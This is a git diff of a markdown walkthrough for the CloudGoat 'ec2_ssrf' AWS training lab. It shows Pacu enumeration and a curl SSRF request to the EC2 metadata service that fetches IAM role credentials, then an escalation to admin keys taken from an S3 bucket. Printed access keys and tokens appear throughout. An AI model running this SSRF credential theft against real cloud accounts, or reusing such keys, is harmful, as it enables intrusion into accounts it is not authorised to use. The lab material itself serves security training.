@@ -13,7 +13,11 @@ This challenge can be found [here](https://github.com/RhinoSecurityLabs/cloudgoa
 
 According to the documentation the goal for this challenge is:
 ```
-Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.
+Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where 
+hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request 
+forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker 
+gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete 
+the scenario.
 ```
 ------ 
 
@@ -61,7 +65,24 @@ Lambda: {
             "Region": "us-east-1",
             "Code": {
                 "RepositoryType": "S3",
-                "Location": "https://prod-04-2014-tasks.s3.amazonaws.com/snapshots/944882903810/cg-lambda-cgid0aj9eyqxxk-659a6627-2c01-4ce7-b935-905dec3e69f9?versionId=.Uj9IkNL29ghHk8EBxIk9zxP3FyhZfUP&X-Amz-Security-Token=AgoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQCIH8VXfYuJBM8GAobRjLyNkURAscIMs%2FfQeirURZHWiinAiB6KACxP2dRKy0TfwPWQqi0nqenb4FEtfX%2BKyz1PsG07iraAwheEAAaDDc0OTY3ODkwMjgzOSIMkjBL3mflx6ZcADGrKrcDtYwKqJk6NjQWvHWIfweyBYlfPV27gPlD45pkIAvwMS%2BJgVN13mh8eNS2lr8JP%2BJzsP8F6z3qRFF%2FVS9%2B9RHcRqVAbx2IcpFRI50yofX5hEkXZc4KahyFm%2B7IrgCFvYwSy3AQxTi%2B9QnU%2F3iL7Bl3I0sck6XvDsgtkjq%2FGeC%2FPN82Nu92%2F%2Fe7fA1NJ9BUFEPY6gUtzqcoh2wjoNeNT7OOd9aSSBKx5a0EZsnotM%2BDI7fCONL3gz6ttLlLUOfA2SiJYjS2st55VMi6IBaCKo4NZrjMj3zztfjSsrnbp7HFEUtaIs695SCTTeMeP29LAkdc1d1E97zW1xTlaobXIsNAJuTQ22SmnCWkDZO%2BH0TZBCkmXkDIjrAnfka7N3%2FqcGvHHs0SmW9TIKHZ4qCH9eDMGWHu948PHZvGlHCiv11RCmtPEg5j8p0eNGW1hzBjbxVYz2RKHQ53cHRoRXY8SZub1NdglAwPsZAdy1BQyGXGpHkxLCCQh0gA7A5Eus4GBBRSJsXQdj22UVO%2BuDiTysIS0n68ZzzoY%2B8O8hqrt26zTPs6Rsl0U2lpzIsiJp9CQwPfEEd2BqZ9szDf7bLsBTq1ASRYKnl3krwcdL0yQUz1fRY5pszD8yyZQjQUz0f4jouTdr%2Fzp2fBBUXKUzgEUCVUFi5wpHldOFDGP3vMbDH0SkdwHr%2BaQdD6LdkvFapW78gTlLYPMEX2mF%2BgA4jO5tgLsqVYDzEs7L9EYW2J9fQGU%2B1RqJv8iiGjA%2F6oPex0ZSWjX0coCDaRuTny2MhPtCeW3bjuMosPYtlqFCNFYroJR2aRo7JvlMRxwYCNkEcfDARGaC%2FOmN0%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20190926T135120Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIA25DCYHY3X42O2HL7%2F20190926%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=093468450079b02b932d86b8a06eeae2bce113fb8902810e37ee96d0bd8992a5"
+                "Location": "https://prod-04-2014-tasks.s3.amazonaws.com/snapshots/944882903810/cg-lambda-cgid0aj9eyq
+                             xxk-659a6627-2c01-4ce7-b935-905dec3e69f9?versionId=.Uj9IkNL29ghHk8EBxIk9zxP3FyhZfUP&X-Am
+                             z-Security-Token=AgoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQ
+                             CIH8VXfYuJBM8GAobRjLyNkURAscIMs%2FfQeirURZHWiinAiB6KACxP2dRKy0TfwPWQqi0nqenb4FEtfX%2BKyz
+                             1PsG07iraAwheEAAaDDc0OTY3ODkwMjgzOSIMkjBL3mflx6ZcADGrKrcDtYwKqJk6NjQWvHWIfweyBYlfPV27gPl
+                             D45pkIAvwMS%2BJgVN13mh8eNS2lr8JP%2BJzsP8F6z3qRFF%2FVS9%2B9RHcRqVAbx2IcpFRI50yofX5hEkXZc4
+                             KahyFm%2B7IrgCFvYwSy3AQxTi%2B9QnU%2F3iL7Bl3I0sck6XvDsgtkjq%2FGeC%2FPN82Nu92%2F%2Fe7fA1NJ
+                             9BUFEPY6gUtzqcoh2wjoNeNT7OOd9aSSBKx5a0EZsnotM%2BDI7fCONL3gz6ttLlLUOfA2SiJYjS2st55VMi6IBa
+                             CKo4NZrjMj3zztfjSsrnbp7HFEUtaIs695SCTTeMeP29LAkdc1d1E97zW1xTlaobXIsNAJuTQ22SmnCWkDZO%2BH
+                             0TZBCkmXkDIjrAnfka7N3%2FqcGvHHs0SmW9TIKHZ4qCH9eDMGWHu948PHZvGlHCiv11RCmtPEg5j8p0eNGW1hzB
+                             jbxVYz2RKHQ53cHRoRXY8SZub1NdglAwPsZAdy1BQyGXGpHkxLCCQh0gA7A5Eus4GBBRSJsXQdj22UVO%2BuDiTy
+                             sIS0n68ZzzoY%2B8O8hqrt26zTPs6Rsl0U2lpzIsiJp9CQwPfEEd2BqZ9szDf7bLsBTq1ASRYKnl3krwcdL0yQUz
+                             1fRY5pszD8yyZQjQUz0f4jouTdr%2Fzp2fBBUXKUzgEUCVUFi5wpHldOFDGP3vMbDH0SkdwHr%2BaQdD6LdkvFap
+                             W78gTlLYPMEX2mF%2BgA4jO5tgLsqVYDzEs7L9EYW2J9fQGU%2B1RqJv8iiGjA%2F6oPex0ZSWjX0coCDaRuTny2
+                             MhPtCeW3bjuMosPYtlqFCNFYroJR2aRo7JvlMRxwYCNkEcfDARGaC%2FOmN0%3D&X-Amz-Algorithm=AWS4-HMA
+                             C-SHA256&X-Amz-Date=20190926T135120Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Cr
+                             edential=ASIA25DCYHY3X42O2HL7%2F20190926%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature
+                             =093468450079b02b932d86b8a06eeae2bce113fb8902810e37ee96d0bd8992a5"
             },
             "Tags": {
                 "Name": "cg-lambda-cgid0aj9eyqxxk"
@@ -77,48 +98,41 @@ We’ll come back to those keys in a second, lets grab the Lambda function and s
 ```
 def handler(event, context):
     # You need to invoke this function to win!
-    return "You win!"
-```
+    return "You win!"```
 
 Nothing of real interest here just the function that needs to be called to 'win' the challenge.
 
 Lets add those keys discovered from the environment variables and see what they do:
 
 ```
-aws sts get-caller-identity --profile souls-lambda
-```
+aws sts get-caller-identity --profile souls-lambda```
 
 Neat its a new user ‘wrex’
 
 Lets use wrex to enumerate:
 ```
 run lambda__enum —region us-east-1   #Fails no permissions
-run iam__bruteforce_permissions    #Works 86 allow permissions found looks like everything is tied to an ec2
-```
+run iam__bruteforce_permissions    #Works 86 allow permissions found looks like everything is tied to an ec2```
 
 Lets see what instances are running:
 
 ```
-aws ec2 describe-instances --output table --profile wrex --region us-east-1
-```
+aws ec2 describe-instances --output table --profile wrex --region us-east-1```
 
 Looks like there is 1 instance running. It has a public IP, and the security groups seem to allow ssh and internet access based on there names. Lets confirm that by first checking the ‘http’ group:
 
 ```
-aws ec2 describe-security-groups --group-id sg-01ba15f6900fb29b5 --output table --profile wrex —region us-east-1
-```
+aws ec2 describe-security-groups --group-id sg-01ba15f6900fb29b5 --output table --profile wrex —region us-east-1```
 
 The output shows that tcp 80 is allowed in to the instance. Lets check the ’ssh’ group
 
 ```
-aws ec2 describe-security-groups --group-id  sg-0c7cb6af2ad26f721 --output table --profile wrex —region us-east-1
-```
+aws ec2 describe-security-groups --group-id  sg-0c7cb6af2ad26f721 --output table --profile wrex —region us-east-1```
 
 Looks like we also have ssh access to the box. So, what’s running on this IP on port 80? Lets curl it!
 
 ```
-curl http://ec2-54-85-35-195.compute-1.amazonaws.com
-```
+curl http://ec2-54-85-35-195.compute-1.amazonaws.com```
 
 Comes back with the response:
 
@@ -276,8 +290,7 @@ All good signs!
 
 Lets see if we can find credentials!
 ```
-curl http://ec2-54-85-35-195.compute-1.amazonaws.com?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid0aj9eyqxxk/
-```
+curl http://ec2-54-85-35-195.compute-1.amazonaws.com?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid0aj9eyqxxk/```
 
 Boom, keys!
 
@@ -288,18 +301,16 @@ Boom, keys!
   "Type" : "AWS-HMAC",
   "AccessKeyId" : "ASIA5X73I5MBK5DG5SMA",
   "SecretAccessKey" : "i0i/UIiETrHbCZ6rnxc96avTMr9NHAL5aSGZb6V2",
-  "Token" : "AgoJb3JpZ2luX2VjEIb//////////wEaCXVzLWVhc3QtMSJGMEQCIB0MPkK2gpMCcwIHR2w20WGLJyNVDpC+OMZI/J+dwAz6AiAFroKN2I9gvG3riTIwOIh3o0ZaJOSaq+BU8dpAhL44dyraAwhfEAAaDDk0NDg4MjkwMzgxMCIM/S8+QgbEvANvMAlsKrcDIlMfhNPdn6sOo2EQ2AkDsrjDuoRDc9+YKVfMiBgb9/gHlXswS/H9X2jAhMGM9dEoidmSch6S1cwWORhP69+cRgAg6yzYIqPZIKXOqBTz7Z0VpYE/3KepOTQY2xq5OIdnjT1k0iUTM6QpeCIqk/xJH/zjvcN5FbdZoN9QIQQyXW+nvfdBg3Ks0kV00nHo3HfU9FDv2Tp6yUxhGuV6kGR1aq/GpEcr0hrxplba0YMpe3uqGMlWCBewwXS63Uz1Y9WeAPCAe+1Nda78ZpUqm6z6Z8CqyI4ZFB4AMMimRbOmUMcCrSMDD4x28aomYG4kK8m5AXM7hEuOw836WHxgSrNxfeb8pxw7BThcFi9oi+isF8sIDNGf/bKdZ348EhPZTzaQ4Yo6OAIIk7uhAKxa5JhuaTcZ3JBng8g+H2uwwF+TKYjuH1JK3FhskU/0S0K/8WgklsNPPrwYEVYsaT+C76D4QpjY76oQ/mt9vlyNcHEmksukD8l4SiGDa3xB1OY64VNi0CcJnSpjk0KRCMJ5cvUdwEB+XeEnzMVh62iXvkwM0TyEV3RYSSjCGuQbA+IO4zMfpulo0FqtsDDq/rLsBTq1AQPsJYoCHxc/X2C0Cjb7rlwhxddmgLkfzDAnpgjgn5Jvs9y+JwPhxd0oE1k9JgFotyBQEpmjUSodMx3haLKDqGS2sLJLQRaixfA9d+TsHgu4T9cZFBHgipAFCahV3sVBFlod7natXwxWgUlg3sfKMgVSPC9S7kD+9l5nQWR8MMGRvnlZHIoNEwO6VH5lTFVO95g2yMR36X4zOx14mpZwUAsqRTfK2WTqyjB4+BMDB/DjS9oUZTo=",
+  "Token" : "AgoJb3JpZ2luX2VjEIb//////////wEaCXVzLWVhc3QtMSJGMEQCIB0MPkK2gpMCcwIHR2w20WG",
   "Expiration" : "2019-09-26T20:13:50Z"
-}
-```
+}```
 
 Lets set these as another profile and see what we can do.
 
 Dropping them into pacu they seem pretty limited, if we brute force 
 
 ```
-run iam__bruteforce_permissions
-```
+run iam__bruteforce_permissions```
 
 The only thing these credentials provide access to is s3.lets see what’s there. We’ll add the session to aws credentials and include the token with
 aws_session_token
@@ -307,27 +318,23 @@ aws_session_token
 Now we can ls s3
 
 ```
-aws s3 ls --profile ec2
-```
+aws s3 ls --profile ec2```
 
 Interesting a bucket, with a file called admin-user.txt what’s in there?
 
 ```
 cat admin-user.txt 
 AKIA5X73I5MBL22TOFFD
-mGJdldTovP4OIxSMUiodhdPyAjdbbTQTtxFt+piP
-```
+mGJdldTovP4OIxSMUiodhdPyAjdbbTQTtxFt+piP```
 
 Lets plug those into pacu/aws cli and see what we can do
 
 ```
-aws configure —profile admin
-```
+aws configure —profile admin```
 
 Validate they work:
 ```
-aws get-caller-identity —profile admin
-```
+aws get-caller-identity —profile admin```
 
 Neat now we’re ’Shepard’ 
 
@@ -335,12 +342,12 @@ Set these keys in pacu and we can now run admin functions!
 
 ```
 run aws__enum_spend
-run aws__enum_account
-```
+run aws__enum_account```
+
 Knowing that we have full admin rights to this account we can now run the Lambda script:
+
 ```
-aws lambda invoke --function-name cg-lambda-cgid0aj9eyqxxk --profile admin --region us-east-1 ./win.txt
-```
+aws lambda invoke --function-name cg-lambda-cgid0aj9eyqxxk --profile admin --region us-east-1 ./win.txt```
 
 We run this and get a json response with StatusCode 200 and when we cat win.txt we are greeted with “You win!"
 
